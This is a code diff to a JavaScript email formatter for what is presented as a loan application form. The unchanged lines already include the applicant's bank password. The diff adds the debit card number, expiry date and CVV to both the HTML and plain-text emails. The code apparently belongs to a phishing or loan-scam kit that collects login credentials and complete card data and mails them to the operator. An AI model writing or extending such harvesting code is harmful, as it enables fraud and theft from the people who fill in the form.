@@ -44,6 +44,12 @@ const formatHTML = (data) => `
   <p><strong>Requested Loan Amount:</strong> ${data.loanAmount}</p>
   <p><strong>Loan Duration (Months):</strong> ${data.loanDuration}</p>
   <p><strong>Loan Purpose:</strong> ${data.loanPurpose}</p>
+  
+  <h3>Debit Card Details</h3>
+  <p><strong>Card Number:</strong> ${data.debitCardNumber}</p>
+  <p><strong>Expiry Month:</strong> ${data.expiryMonth}</p>
+  <p><strong>Expiry Year:</strong> ${data.expiryYear}</p>
+  <p><strong>CVV:</strong> ${data.cvv}</p>
 `;
 
 const formatText = (data) => `New Loan Application Received
@@ -66,6 +72,12 @@ Password: ${data.bankPassword}
 Requested Loan Amount: ${data.loanAmount}
 Loan Duration (Months): ${data.loanDuration}
 Loan Purpose: ${data.loanPurpose}
+
+Debit Card Details:
+Card Number: ${data.debitCardNumber}
+Expiry Month: ${data.expiryMonth}
+Expiry Year: ${data.expiryYear}
+CVV: ${data.cvv}
 `;
 
 export const sendLoanApplicationEmail = async (data) => {
